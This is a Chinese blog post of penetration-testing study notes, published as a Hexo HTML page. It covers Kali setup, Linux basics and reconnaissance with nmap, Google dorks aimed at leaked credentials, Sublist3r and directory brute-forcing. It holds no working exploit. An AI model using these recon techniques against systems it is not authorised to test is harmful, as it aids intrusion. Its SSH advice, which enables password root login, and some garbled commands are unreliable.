@@ -1,0 +1,1509 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="kali Linux_环境安装Kali****系统更新——选择不更新Metasploit \1.  查看当前系统中所有软件包状态 sudo dpkg -get-selections | more 可以找到metasploit-framework软件包名为“Metasploit-framework” \2.  给metasploit-framework锁定当前版本不更新 sudo apt-mark">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kali-linux">
+<meta property="og:url" content="http://example.com/2022/08/17/kali-Linux/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="kali Linux_环境安装Kali****系统更新——选择不更新Metasploit \1.  查看当前系统中所有软件包状态 sudo dpkg -get-selections | more 可以找到metasploit-framework软件包名为“Metasploit-framework” \2.  给metasploit-framework锁定当前版本不更新 sudo apt-mark">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-08-17T02:16:24.941Z">
+<meta property="article:modified_time" content="2022-05-30T03:11:23.926Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="kali">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/08/17/kali-Linux/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>kali-linux | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/kali-Linux/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          kali-linux
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-30 11:11:23" itemprop="dateModified" datetime="2022-05-30T11:11:23+08:00">2022-05-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="kali-Linux-环境安装"><a href="#kali-Linux-环境安装" class="headerlink" title="kali Linux_环境安装"></a>kali Linux_环境安装</h1><h2 id="Kali-系统更新"><a href="#Kali-系统更新" class="headerlink" title="Kali****系统更新"></a><strong>Kali****系统更新</strong></h2><p>——选择不更新Metasploit</p>
+<p>\1.  查看当前系统中所有软件包状态</p>
+<p>sudo dpkg -get-selections | more</p>
+<p>可以找到metasploit-framework软件包名为“Metasploit-framework”</p>
+<p>\2.  给metasploit-framework锁定当前版本不更新</p>
+<p>sudo apt-mark hold Metasploit-framework</p>
+<p>\3.  查看当前已锁定的软件包</p>
+<p>sudo dpkg –get-selections | grep hold</p>
+<p>\4.  取消软件保留设置</p>
+<p>sudo apt-mark unhold Metasploit-framework</p>
+<p>——kali系统更新后出现的问题</p>
+<p>​    进入/usr/share/Metasploit-framework   目录下使用命令</p>
+<p>​    gem install bundler</p>
+<p>​    gem update –system</p>
+<p>​    然后成功启动</p>
+<h2 id="SSH-系统服务"><a href="#SSH-系统服务" class="headerlink" title="SSH****系统服务"></a><strong>SSH****系统服务</strong></h2><p>——SSH服务简介：</p>
+<p>​    SSH服务是目前较可靠，专为远程登录服务器和其他网络服务提供安全性的协议。</p>
+<p>​    SSH是标准的网络协议，可用于大多数UNIX操作系统，能够实现字符界面的远程登陆管理，它默认使用22号端口，采用密文的形式在网络中传输数据，相对于通过明文传输的Telnet，具有更高的安全性。</p>
+<p>​    SSH提供了口令和密钥两种用户验证方式，这两者都是通过密文传输数据的。</p>
+<p>​    SSH对我们的主要作用是：能够操作远程服务器系统。</p>
+<p>——配置流程</p>
+<p>1.使用编辑器打开ssh配置</p>
+<p>leafpad /etc/ssh/ssh_config</p>
+<p>​    搜索：</p>
+<p>​        #PasswordAuthentication yes                     (去掉注释)</p>
+<p>​       #PermitRootLogin prohibit-password              （去掉注释后面的并删除改为yes）</p>
+<p>​    2.使用命令行模式开启SSH服务</p>
+<p>​       service ssh start</p>
+<p>​    3.查看服务开启状态</p>
+<p>​       service ssh status</p>
+<p>\5.  登录测试</p>
+<p>使用xshell、putty等工具测试</p>
+<h2 id="Kali-工具包简介"><a href="#Kali-工具包简介" class="headerlink" title="Kali****工具包简介"></a><strong>Kali****工具包简介</strong></h2><p>kali Linux含有可用于渗透测试的各种工具，这些工具程序大体可以分为以下几类。</p>
+<p>\1.  信息收集：这类工具主要用来帮助我们收集目标的网络架构、网站脚本语言、网站信息泄露等。</p>
+<p>\2.  漏洞评估：这类工具都可以扫描目标系统上的漏洞，扫描主机漏洞，系统漏洞。</p>
+<p>\3.  漏洞利用：这类工具可以利用在目标系统中发现的漏洞，让我们针对性的去利用攻击。</p>
+<p>\4.  Web应用：即与Web应用有关的工具，关于web方面的扫描器、爆破等工具</p>
+<p>\5.  密码攻击：提供在线密码破解或者是离线的密码破解工具给我们使用</p>
+<h2 id="什么是shell"><a href="#什么是shell" class="headerlink" title="什么是shell"></a><strong>什么是shell</strong></h2><p>——了解什么是shell</p>
+<p>​    在计算机科学中，shell俗称外壳（用来区别于内核），它类似于windows的DOS，能够接收用户的命令并翻译给操作系统执行，是用户与操作系统（内核）之间的桥梁。</p>
+<p>​    查看系统支持哪些shell:</p>
+<p>​       cat /etc/shells</p>
+<p>​    查看正在使用的shell:</p>
+<p>​       echo $SHELL</p>
+<p>​    shell与终端的区别：</p>
+<p>​       终端：接收用户的输入，并传递给shell程序，接收程序输出并展示到屏幕.</p>
+<p>shell：接收并解析用户的命令给操作系统执行，将结果输出到终端。</p>
+<h2 id="vim-编辑器"><a href="#vim-编辑器" class="headerlink" title="vim****编辑器"></a><strong>vim****编辑器</strong></h2><p>——vi/vim编辑器模式</p>
+<p>​    命令模式（默认）：刚进入vim的时候，默认就是命令模式，可以复制行删除行等。</p>
+<p>​    输入模式：可以输入内容。</p>
+<p>——模式转换</p>
+<p>​    使用insert键切换进入输入模式：命令模式à输入模式</p>
+<p>​    i：在当前光标所在字符的前面，转为输入模式</p>
+<p>​    I：在当前光标所在行的行首转换为输入模式</p>
+<p>​    a：在当前光标所在字符的后面，转换为输入模式</p>
+<p>​    A：在光标所在行的行尾，转换为输入模式</p>
+<p>​    o：在当前光标所在行的下方，新建一行，并转换为输入模式</p>
+<p>​    O：在当前光标所在行的上方，新建一行，并转换为输入模式</p>
+<p>​    s：删除光标所在字符</p>
+<p>​    r：替换光标处字符</p>
+<p>——键入模式à命令模式</p>
+<p>​    ESC键</p>
+<p>——关闭保存文件</p>
+<p>​    shift键+:号</p>
+<p>​    命令模式下：</p>
+<p>​    w：保存</p>
+<p>​    q：退出</p>
+<p>​    wq和x都是保存退出</p>
+<p>​    q!：强制退出</p>
+<p>​    w!：强制保存，管理员才有权限</p>
+<p>——查找</p>
+<p>​    普通模式：</p>
+<p>​    /PATTERN：从当前位置向后查找</p>
+<p>​    ? PATTERN：从当前位置向前查找</p>
+<h2 id="Linux-常用命令"><a href="#Linux-常用命令" class="headerlink" title="Linux****常用命令"></a><strong>Linux****常用命令</strong></h2><p><strong>查找Linux命令：<a target="_blank" rel="noopener" href="http://linux.51yip.com/">http://linux.51yip.com/</a></strong></p>
+<p>echo命令：</p>
+<p>​    echo命令用于在终端输出字符串或变量提取后的值，格式为“echo [字符串 | $变量]”。</p>
+<p>date命令：</p>
+<p>​    date命令用于显示及设置系统的时间或日，格式为“date [] [+指定的格式]”。</p>
+<p>poweroff命令：</p>
+<p>​    poweroff命令用于关闭系统，其格式为poweroff。</p>
+<p>top命令：</p>
+<p>​    显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率等，格式为“top [参数]”。</p>
+<p>​    ifconfig命令：</p>
+<p>​       用于获取网卡配置与网络状态等信息，格式为“ifconfig [网络设备] [参数]”</p>
+<p>​    uname命令：</p>
+<p>​       用于查看系统内核与系统版本等信息，格式为“uname [-a]“</p>
+<p>​    who命令：</p>
+<p>​       用于查看当前登入主机的用户终端信息，格式为“who [参数]“</p>
+<p>​    history命令：</p>
+<p>​       用于显示历史执行过的命令就，格式为“history [数值]“</p>
+<p>​    pwd命令：</p>
+<p>​       用于显示用户当前所处的工作目录，格式为“pwd [选项]“</p>
+<p>​    cat命令：</p>
+<p>​       用于查看纯文本文件（内容较少的），格式为“cat [选项] [文件]”</p>
+<p>​    more命令：</p>
+<p>​       用于查看纯文本文件（内容较多的），格式为“more [选项]文件”</p>
+<p>​    head命令：</p>
+<p>​       用于查看纯文本文档的前N行，格式为“head [选项] [文件]”</p>
+<p>​    wc命令：</p>
+<p>​       用于统计指定文本的行数、字数、字节数，格式为“wc [选项] 文本”</p>
+<p>​    stat命令：</p>
+<p>​       用于查看文件的具体存储信息和时间等信息，格式为“stat 文件名称”</p>
+<p>​    touch命令：</p>
+<p>​       用于创建空白文件或设置文件的时间，格式为“touch [选项] [文件]”</p>
+<p>​    mkdir命令：</p>
+<p>​       用于创建空白的目录，格式为“mkdir [选项] 目录”</p>
+<p>​    mv命令：</p>
+<p>​       用于移动文件或将文件重命名，格式为“mv [选项] 源文件 [目标路径|目标文件名]”</p>
+<p>​    file命令：</p>
+<p>​       用于查看文件的类型，格式为“file 文件名”</p>
+<p>——使用chmod命令进行文件的权限修改</p>
+<p>​    chmod [选项] &lt;模式，模式…&gt; &lt;文件名…&gt;</p>
+<p>​    文件和目录的权限：linux的文件和目录的权限有所不同。</p>
+<p>​    文件的权限：</p>
+<p>​    r 读文件   数值为4</p>
+<p>​    w 写文件  数值为2</p>
+<p>​    x 执行文件 数值为1</p>
+<p>​    目录的权限：</p>
+<p>​    x r 可以读取（cp）和查看（ls）目录的内容（即文件和目录），同时还需要可执行权限。</p>
+<p>​    x w 可以在目录里创建文件（touch）与目录（mkdir）还有删除文件（rm）与目录（rmdir），同时还需要可执行权限。</p>
+<p>​    x x 可以进入目录（cd）和执行文件 实践过程</p>
+<p>Linux文件权限和目录配置：<a target="_blank" rel="noopener" href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php">http://cn.linux.vbird.org/linux_basic/0210filepermission.php</a></p>
+<p>用户管理：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html">https://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html</a></p>
+<p>github项目克隆到本地：git clone [github克隆链接]</p>
+<p>——查看用户信息：cat /etc/passwd</p>
+<p>​    添加用户：useradd -m 用户名  自动在home文件夹下创建用户名的目录。</p>
+<p>​             useradd -g 组名 用户名    指定添加在某个组里。</p>
+<p>​             passwd 用户名     修改key的新密码</p>
+<p>​    删除用户：userdel -r 用户名    删除目录以及用户</p>
+<p>​    查看用户组信息：cat /etc/group</p>
+<p>​    查看用户组归属：groups 用户名</p>
+<p>​    添加组：usermod -g 组名 用户名</p>
+<p>​            usermod -a-G 组名 用户名</p>
+<p>​    删除组：groupdel 组名</p>
+<p>​    设置权限：chmod 777 文件名     给当前文件设置为777权限</p>
+<p>​             chmod -R 777目录名    给当前目录递归权限为777</p>
+<p>​    小游戏：<a target="_blank" rel="noopener" href="https://linuxz.github.io/tianyizone/linux-chmod-permissions.html">https://linuxz.github.io/tianyizone/linux-chmod-permissions.html</a></p>
+<p>——软件安装管理</p>
+<p>​    dpkg：dpkg是一个Debian的一个命令行工具，它可以用来安装、删除、构建和管理Debian的软件包。</p>
+<p>​           安装软件：dpkg -I xxx.deb</p>
+<p>​           卸载软件：dpkg -r xxx.deb 删除软件包</p>
+<p>​                    dpkg -r –purge xxx.deb  连同配置文件一起删除</p>
+<p>​    gdebi：gdebi是一个轻量级的deb安装工具，它能代替臃肿的ubuntu软件中心安装deb.</p>
+<p>​           安装gdebi：sudo apt-get update</p>
+<p>​                      sudo apt-get install gdebi</p>
+<p>​           安装软件：sudo gdebi xxx.deb</p>
+<p>​                     图形化安装</p>
+<p>——搜索命令：find命令 所查找的目录路径</p>
+<p>​              find  ./kali/ -print 指定目录查找并输出</p>
+<p>​              find ./kali/ -exec ls () ; 指定目录以shell脚本运行并输出</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/WX_East/article/details/68530883">https://blog.csdn.net/WX_East/article/details/68530883</a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="信息收集什么"><a href="#信息收集什么" class="headerlink" title="信息收集什么"></a>信息收集什么</h2><p>目标人物：电话、邮箱、密码、whois……. <a target="_blank" rel="noopener" href="http://tool.chinaz.com/">http://tool.chinaz.com/</a></p>
+<p>目标环境：域名、脚本语言、数据库、中间件、框架、cms、开放端口……</p>
+<p>目标事件：历史漏洞、使用手册、使用说明、通知、公众号……</p>
+<p>社工密码字典在线生成：<a target="_blank" rel="noopener" href="https://api.xiaobaibk.com/lab/guess/">https://api.xiaobaibk.com/lab/guess/</a></p>
+<h2 id="信息收集能干嘛"><a href="#信息收集能干嘛" class="headerlink" title="信息收集能干嘛"></a>信息收集能干嘛</h2><p>例子1：cms可能存在通杀漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击。</p>
+<p>例子2：有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379可以尝试爆破或者使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表不同的web网站。</p>
+<h2 id="信息收集报告编写"><a href="#信息收集报告编写" class="headerlink" title="信息收集报告编写"></a>信息收集报告编写</h2><p>记录收集到的信息</p>
+<p>目标人物：电话、邮箱、密码、whois……. </p>
+<p>目标环境：域名、脚本语言、数据库、中间件、框架、cms、开放端口……</p>
+<p>目标事件：历史漏洞、使用手册、使用说明、通知、公众号、手机app……</p>
+<h2 id="谷歌语法Google-hacking"><a href="#谷歌语法Google-hacking" class="headerlink" title="谷歌语法Google hacking"></a>谷歌语法Google hacking</h2><p>——传统的搜索引擎能够有效抓取对方网站页面内容</p>
+<p>\1.  公司动态；2.组织文档；3.用户名/密码；4.测试文件；5.历史数据</p>
+<p>——常见的谷歌语法帮助我们缩小目标搜索范围</p>
+<p>site：搜索范围限制在某网站或顶级域名中。</p>
+<p>inurl：当我们用inurl进行查询的时候，google会返回哪些在URL（网址）里边包含了我们查询关键词的网页。</p>
+<p>intext：当我们用intext进行查询的时候，google会返回那些在文本正文里边包含了我们查询关键词的网页。</p>
+<p>intitle：当我们用intitle进行查询的时候，google会返回哪些网页标题为查询结果。</p>
+<p>google镜像：<a target="_blank" rel="noopener" href="https://www.ggjxz.top/">https://www.ggjxz.top/</a></p>
+<p>​              <a target="_blank" rel="noopener" href="https://gg456.top/">https://gg456.top/</a></p>
+<p>​              <a target="_blank" rel="noopener" href="http://tools.bugscaner.com/google/">http://tools.bugscaner.com/google/</a></p>
+<p><a target="_blank" rel="noopener" href="https://go-xyz.xyz/">https://go-xyz.xyz/</a></p>
+<p>google语法例子：</p>
+<p>​    intitle:”netbotz appliance” “ok”</p>
+<p>​    inurl: /admin/login.php</p>
+<p>inur:qq.txt</p>
+<p>filetype:xls “username | password”</p>
+<p>intext:password “Login Info” filetype:txt</p>
+<p>扩展思路：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a> 爬虫协议</p>
+<h2 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><p>——基于物联网搜索，搜索联网的网络设备</p>
+<p>钟馗之眼：<a target="_blank" rel="noopener" href="http://www.zoomeye.org/">http://www.zoomeye.org</a>    傻蛋：<a target="_blank" rel="noopener" href="https://www.oshadan.com/">https://www.oshadan.com</a></p>
+<p>Shodan：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io</a>       Dnsdb：<a target="_blank" rel="noopener" href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p>
+<p>fofa：<a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so</a></p>
+<h2 id="端口扫描-Nmap"><a href="#端口扫描-Nmap" class="headerlink" title="端口扫描-Nmap"></a>端口扫描-Nmap</h2><p>——功能：</p>
+<p>1.检测存活在网络上的主机（主机发现）</p>
+<p>\2.  检测主机上开放的端口（端口发现或枚举）</p>
+<p>\3.  检测到相应的端口（服务发现）的软件和版本</p>
+<p>\4.  检测操作系统，硬件地址，以及软件版本</p>
+<p>\5.  检测脆弱性的漏洞（Nmap的脚本）</p>
+<p>——常用的端口扫描指令</p>
+<p>​    -sS：TCP SYN扫描</p>
+<p>​    -p：指定端口号扫描</p>
+<p>​    -v：显示扫描过程</p>
+<p>​    -F：快速扫描</p>
+<p>​    -Pn：禁止ping后扫描：跳过主机发现的过程进行端口扫描</p>
+<p>​    -A：全面的系统扫描：包括打开操作系统探测、版本探测、脚本扫描</p>
+<p>—扫描指定ip开放端口</p>
+<p>​    命令：nmap -sS -p 端口号 -v 192.168.1.2</p>
+<p>​    使用半开扫描，指定端口号1-65535，显示扫描过程</p>
+<p>—穿透防火墙扫描</p>
+<p>​    命令：nmap -Pn -A 192.168.1.2</p>
+<p>​    服务器禁止ping命令，试试-Pn，nmap参数配合使用</p>
+<p>​    -sU：UDP扫描                         -sT：TCP扫描</p>
+<p>​    -sV：扫描系统和程序版本号检测          –script=vuln：全面的漏洞扫描</p>
+<p>​    -n：禁止反向域名解析                   -R：反向域名解析</p>
+<p>​    -6：启用IPV6扫描</p>
+<p>​    —漏洞扫描</p>
+<p>​    nmap -script=vuln 192.168.1.2</p>
+<p>​    使用vuln脚本进行全面的漏洞扫描</p>
+<p>​    信息安全漏洞门户：<a target="_blank" rel="noopener" href="http://cve.scap.org.cn/">http://cve.scap.org.cn/</a></p>
+<p>​                     <a target="_blank" rel="noopener" href="https://cve.mitre.org/">https://cve.mitre.org/</a></p>
+<p>—指纹识别扫描</p>
+<p>​    nmap -sV -v 192.168.1.2</p>
+<p>​    扫描系统和程序版本号检测，并且输出详细信息。</p>
+<p>——端口扫描的状态</p>
+<p>​    opened：端口开启                          closed：端口关闭</p>
+<p>​    Filtered：端口被过滤，数据没有到达主机，返回的结果为空，数据被防火墙</p>
+<p>​    Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态</p>
+<p>​    open|filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中。</p>
+<p>​    close|filtered：关闭或者被过滤，只发生在IP ID idle扫描。</p>
+<p>——使用Nmap中的脚本进行信息收集</p>
+<p>​    —whois信息查询</p>
+<p>​    —DNS解析查询</p>
+<p>——Nmap中的漏洞脚本扫描</p>
+<p>​    Nmap官方脚本：<a target="_blank" rel="noopener" href="https://svn.nmap.org/nmap/scripts/">https://svn.nmap.org/nmap/scripts/</a></p>
+<p>​    Nmap中文手册：<a target="_blank" rel="noopener" href="http://www.nmap.com.cn/doc/manual.shtm">http://www.nmap.com.cn/doc/manual.shtm</a></p>
+<p>​    Nmap官方手册：<a target="_blank" rel="noopener" href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a></p>
+<p>​    黑客电影：<a target="_blank" rel="noopener" href="https://nmap.org/movies/">https://nmap.org/movies/</a></p>
+<p>脚本保存位置：/usr/share/nmap/scripts/</p>
+<p>​    —whois信息扫描：nmap –script=whois-domain xxxx.com</p>
+<p>—DNS解析爆破扫描：nmap –script=dns-brut xxxx.com</p>
+<p>——把Nmap扫描结果保存到本地</p>
+<p>​    —标准保存：nmap -oN test.txt xxxx.com</p>
+<p>​    把输出结果保存到指定文件</p>
+<p>​    —保存为Xml格式：nmap -oX test.xml xxxx.com</p>
+<p>​    需要用浏览器打开，查看结果</p>
+<h2 id="子域名-amp-目录扫描"><a href="#子域名-amp-目录扫描" class="headerlink" title="子域名&amp;目录扫描"></a>子域名&amp;目录扫描</h2><p>——子域名打开就是404页面，403页面怎么做</p>
+<p>​    案例：如何发现ucweb.com的两个XSS</p>
+<p>​    <a target="_blank" rel="noopener" href="https://nosec.org/home/detail/2011.html">https://nosec.org/home/detail/2011.html</a></p>
+<p>——子域在线收集</p>
+<p>\1.  谷歌语法：通过特定站点范围查询子域：sit: xxxx.com</p>
+<p>\2.  在线枚举爆破：<a target="_blank" rel="noopener" href="http://phpinfo.me/domain/">http://phpinfo.me/domain/</a></p>
+<p>\3.  证书搜索：基于SSL证书查询子域：<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a></p>
+<p>\4.  DNS搜索：基于DNS记录查询子域：<a target="_blank" rel="noopener" href="https://dns.bufferover.run/dns?q=xxx">https://dns.bufferover.run/dns?q=xxx</a></p>
+<p>——子域收集-Fuzzdomain工具</p>
+<p>​    使用github下载相应的子域发现工具：<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r/">https://github.com/aboul3la/Sublist3r/</a></p>
+<p>\1.  安装模块：sudo pip install -r requirements.txt</p>
+<p>\2.  枚举目标子域：python sublist3r.py -d aqlab.cn</p>
+<p>\3.  枚举子域并且显示开放80和443端口的子域</p>
+<p>python sublist3r.py -d aqlab.cn -p 80,443</p>
+<p>\4.  枚举目标子域并保存：python sublist3r.py -d aqlab.cn -o aqlab.txt</p>
+<p>——用户事件</p>
+<p>​    通过目标站点的用户事件找到子域以及敏感信息</p>
+<p>\1.  历史漏洞</p>
+<p>乌云镜像：<a target="_blank" rel="noopener" href="https://www.anquan.us/">https://www.anquan.us/</a></p>
+<p>\2.  使用手册，通知</p>
+<p>学院通知：<a target="_blank" rel="noopener" href="https://dwz.cn/OOWeYYy6">https://dwz.cn/OOWeYYy6</a></p>
+<p>——使用御剑后台扫描工具扫描敏感目录</p>
+<p>——robots.txt文件的作用</p>
+<p>​    —Robots协议：也称为爬虫协议、机器人协议等。全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p>
+<p>​    —Robots.txt文件的重要性</p>
+<p>​       它是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据robots.txt文件内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减少搜索引擎蜘蛛的工作量。</p>
+<p>​    —Robots.txt文件的存放位置</p>
+<p>​       网站根目录下，通过“域名/robots.txt”能正常访问即可，如http://域名/robots.txt</p>
+<p>​       写法：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc</a></p>
+<p>——目录扫描-dirbuster</p>
+<p>​    —文件目录：为实现“按名存取”，必须建立文件名与储存空间中物理地址的对应关系，体现这种对应关系的数据结构称为文件目录。</p>
+<p>​    —目录扫描：可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。还能扫描敏感文件，后台文件，数据库文件，和信息泄露文件等等。</p>
+<p>​    —常见的目录信息泄露</p>
+<p>\1.  目录遍历漏洞：（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（web根目录以外的文件），甚至执行系统命令。</p>
+<p>—目录遍历漏洞原理：程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
+<p>\2.  敏感信息泄露：由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。</p>
+<p>比如：</p>
+<p>—通过访问url下的目录，可以直接列出目录下的文件列表；</p>
+<p>—输入错误的url参数后报错信息里包括操作系统、中间件、开发语言的版本或其他信息；（sql注入）</p>
+<p>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登陆地址、内网接口信息，甚至账号密码等。</p>
+<p>​    —常见的源码泄露案例</p>
+<p>​       目录遍历：当没有默认网页时，在网站上显示web服务器显示用户列表中的文件和目录。因此，在apachce服务器上默认文件名为index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。</p>
+<p>​       实例：攻击者浏览目录并访问web应用程序的源代码，备份可能的数据库文件。</p>
+<p>​       <a target="_blank" rel="noopener" href="http://www.sohu.com/a/192064346_653604">http://www.sohu.com/a/192064346_653604</a></p>
+<p>​    —常见的目录扫描方式</p>
+<p>\1.  robots.txt：网站内的robots.txt文件</p>
+<p>\2.  目录爆破：御剑 nikto dirbuster webdirscan…</p>
+<p>\3.  第三方资源利用：Js SDK</p>
+<p>—dirbuster工具说明</p>
+<p>​    Owasp项目，它是一个多线程的基于java的应用程序设计用于暴力破解web应用服务器上的目录名和文件名的工具。</p>
+<p>​    工作原理：Dirbuster是一种履带式和粗暴式的混合物它遵循找到的页面中的所有链接，为可能的文件尝试不同的名称。这些名称可能位于我们使用的文件类似的文件中，也可能由Dirbuster使用Pure Brute Force选项自动生成，并设置字符集以及生成的单词的最小和最大长度。</p>
+<p>​    为确定文件是否存在，dirbuster使用服务器的响应代码。最常见的响应如下所示：</p>
+<p>​    200 ok：文件存在      404 找不到404文件：服务器中不存在该文件</p>
